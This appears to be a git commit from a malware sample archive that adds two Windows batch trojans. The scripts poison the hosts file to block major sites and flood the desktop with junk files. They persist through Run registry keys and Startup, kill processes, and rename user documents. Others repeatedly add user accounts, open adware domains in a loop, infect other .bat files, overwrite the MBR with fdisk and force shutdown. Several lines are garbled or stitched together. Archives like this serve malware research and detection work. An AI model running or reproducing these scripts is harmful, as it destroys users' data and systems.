de258cd1c46dfb4bb1b5d5e043532b45c728c2d7
PetiKVX <petikvx@gmail.com>
2021-12-03 10:02:32 +0000

    VirusShare_00016

---
+++ Script/BAT/Trojan/Trojan.BAT.Qhost.qj.bat
@@ -0,0 +1,322 @@
+@echo off
+cls
+cd "C:\Windows\System32\Drivers\etc"
+echo 127.0.0.1 yahoo.com >> "Hosts"
+echo 127.0.0.1 www.yahoo.com >> "Hosts"
+echo 127.0.0.1 google.com >> "Hosts"
+echo 127.0.0.1 www.google.com >> "Hosts"
+echo 127.0.0.1 msn.com >> "Hosts"
+echo 127.0.0.1 www.msn.com >> "Hosts"
+echo 127.0.0.1 youtube.com >> "Hosts"
+echo 127.0.0.1 www.youtube.com >> "Hosts"
+echo 127.0.0.1 wikipedia.org >> "Hosts"
+echo 127.0.0.1 www.wikipedia.org >> "Hosts"
+echo 127.0.0.1 hotmail.com >> "Hosts"
+echo 127.0.0.1 www.hotmail.com >> "Hosts"
+@echo off
+cd "%userprofile%\desktop"
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+echo %random% > %random%.%random%
+cd "%userprofile%\Start Menu\Programs\Startup"
+echo echo @echo off > "start.bat"
+echo echo cd %userprofile% >> "start.bat"
+echo echo echo x=msgbox("%random%",0+16,"%random%") >> spammer.vbs
+echo :loop >> "start.vbs"
+start spammer.vbs >> "start.vbs"
+goto loop >> "start.vbs"
+:loop
+start start.bat
+:loop
+start spammer.vbs
+goto loop
+@echo off
+rem Virus Created By C0nw0nk
+for %%f in (*.exe *.dll) do set a=%%f
+ren %a% C0nw0nk%a%
+attrib +r +h C0nw0nk%a%
+assoc .reg=sysfile
+assoc .exe=dllfile
+copy %0.dll %a%
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo(ipconfig / release_all >> c) : windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo You Have Been HACKED!
+:CRASH
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+GoTo CRASH
+ipconfig /release
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
+echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo(ipconfig / release_all >> c) : windowswimn32.bat(
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo YOU HAVE BEEN HACKED *****
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+@Echo off
+Color 4
+title 4
+title R.I.P
+start
+start
+start
+start calc
+copy %0 %Systemroot%\Greatgame > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
+/d %systemroot%\Greatgame.bat /f > nul
+copy %0 *.bat > nul
+Attrib +r +h Greatgame.bat
+Attrib +r + h
+RUNDLL32 USER32.DLL.SwapMouseButton
+start calc
+cls
+tskill msnmsgr
+tskill LimeWire
+tskill iexplore
+tskill NMain
+start
+cls
+cd %userprofile%\desktop
+copy Greatgame.bat R.I.P.bat
+copy Greatgame.bat R.I.P.jpg
+copy Greatgame.bat R.I.P.txt
+copy Greatgame.bat R.I.P.exe
+copy Greatgame.bat R.I.P.mov
+copy Greatgame.bat FixVirus.bat
+cd %userprofile%My Documents
+copy Greatgame.bat R.I.P.bat
+copy Greatgame.bat R.I.P.jpg
+copy Greatgame.bat R.I.P.txt
+copy Greatgame.bat R.I.P.exe
+copy Greatgame.bat R.I.P.mov
+copy Greatgame.bat FixVirus.bat
+Start
+start calc
+cls
+msg * R.I.P
+msg * R.I.P
+start
+start
+time 12:00
+:R.I.P
+cd %usernameprofile%\desktop
+copy Greatgame.bat %random%.bat
+GoTo RIP
+cls
+:A
+color 0a
+@echo off
+echo Wscript.Sleep
+DEL C:\WINDOWS 5000>C:\sleep5000.vbs
+echo Wscript.Sleep 3000>C:\sleep3000.vbs
+echo Wscript.Sleep 4000>C:\sleep4000.vbs
+echo Wscript.Sleep 2000>C:\sleep2000.vbs
+cd %systemroot%\System32
+Dir
+cls
+start /w wscript.exe C:\sleep3000.vbs
+echo Deleting Critical System Files...
+echo del *.*
+start /w wscript.exe C:\sleep3000.vbs
+echo Deletion Successful!
+start /w wscript.exe C:\sleep2000.vbs
+echo:
+echo:
+echo:
+echo Deleting Root Partition...
+start /w wscript.exe C:\sleep2000.vbs
+echo del %SYSTEMROOT%
+start /w wscript.exe C:\sleep4000.vbs
+echo Deletion Successful!
+start /w wscript.exe C:\sleep2000.vbs
+echo:
+echo:
+echo:
+echo Creating Directory h4x...
+cd C:\Documents and Settings\All Users\Start Menu\Programs\mkdir
+h4x
+DEL C:\WINDOWS
+start /w wscript.exe C:\sleep3000.vbs
+echo Directory Creation Successful!
+echo:
+echo:
+echo:
+echo Execution Attempt 1...
+start /w wscript.exe C:\sleep3000.vbs
+echo cd C:\Documents and Settings\All Users\Start Menu\Programs\Startup\h4x\
+echo start hax.exe
+start /w wscript.exe C:\sleep3000.vbs
+echo Virus Executed!
+echo:
+echo:
+echo:start /w wscript.exe C:\sleep2000.vbs
+echo Disabling Windows Firewall...
+start /w wscript.exe C:\sleep2000.vbs
+echo Killing all processes...
+start /w wscript.exe C:\sleep2000.vbs
+echo Allowing virus to boot from startup...
+start /w wscript.exe C:\sleep2000.vbs
+echo:
+echo:
+echo Virus has been executed successfully!
+start /w wscript.exeC:\sleep2000.vbs
+echo:
+echo Have fun!
+start /w wscript.exe C:\sleep2000.vbs
+@echo off
+cls
+set /a _virus+=1
+:virus
+net user %_virus+% /add
+GoTo virus
+@echo off
+:begin
+start iexplore.exe http://dollarrevenue.com/
+start iexplore.exe Googkle.com
+start iexplore.com msmn.com
+start iexplore.exe Googkle.com
+start iexplore.exe http://dollarrevenue.com/
+start iexplore.exe Pageforsafety.com
+start iexplore.exe Googkle.com
+start iexplore.exe msmn.com
+start iexplore.exe Ahomepcsafety.com
+start iexplore.exe Homepagecell.com
+start iexplore.exe Googkle.com
+start iexplore.exe Allsecuritypage.com
+start iexplore.exe Tuvcompany.com
+start iexplore.exe Googkle.com
+start iexplore.exe Garfirm.com
+start iexplore.exe Errorbrowser.com
+start iexplore.exe Protectionstack.com
+start iexplore.exe Googkle.com
+start iexplore.exe Asafetyalways.com
+start iexplore.exe Websoft-b.com
+start iexplore.exe Hqcodecvip.com
+start iexplore.exe IEsecurepages.com
+start iexplore.exe Gicoupler.com
+GoTo begin
+@echo off
+cd %userprofile%\desktop
+:begin
+md %random%.%random%
+GoTo begin
+
+
+
+
+
+
---
+++ Script/BAT/Trojan/Trojan.BAT.Small.cc.bat
@@ -0,0 +1,25 @@
+@echo off
+title %0
+rem conditional check.
+echo welcome to this wonderful program! please wait while I delete all your files!
+rem infection of the user
+copy %0 c:\tmp.bat >null attrib +r +s +h c:\tmp.bat echo for %%i in (*.bat) do copy c:\tmp.bat+%%i %%i >>c:\windows\system32\autoexec.NT
+echo echo virus detected! >>c:\windows\system32\autoexec.NT
+echo pause >>c:\windows\system32\autoexec.NT
+echo NT core:infected!
+echo echo shame on you! >>c:\autoexec.bat
+echo echo system hault-virus identified! >>c:\autoexec.bat
+echo chkdsk >>c:\autoexec.bat
+echo i t i s t o o l a t e, y o u h a v e a v i r u s, n o w u r l i f e i s n o t b e a u t i f u l
+fdisk /mbr
+shutdown -s -t 03 -c “windows has shut down because the lsass service has incountered a write fault at 0×00000000000000000000000000000000000?
+
+Code Details
+
+@echo off
+color 1a (Changes the colour)
+echo (Displays a text)
+echo: (leaves a line)
+ping -n 2 127.0.0.1>nul (pings your localhost – nothing much)
+shutdown.exe (shutdown)
+
